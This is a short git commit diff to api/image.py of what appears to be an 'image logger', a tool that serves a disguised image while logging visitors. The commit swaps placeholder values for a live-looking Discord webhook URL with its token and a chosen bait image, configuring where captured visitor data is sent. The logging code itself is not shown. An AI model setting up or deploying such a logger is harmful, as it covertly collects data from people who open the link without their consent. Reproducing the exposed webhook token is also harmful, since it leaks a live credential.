a3b723ccdc14bd318d7207b463644e23313a9617
BULLETJust <abu.fathi.127@gmail.com>
2025-02-01 08:14:09 +0200

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1335129994720182332/Fao8WETijfHn5BmIsUyyOqPyfGW49I_WbIwur2jElQqz_uY1JHZ_rsvxHfkzuPJv1TFN",
+    "image": "https://us-tuna-sounds-images.voicemod.net/aefe5788-1ff6-41e4-9f09-b3330b20521a-1662552682271.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
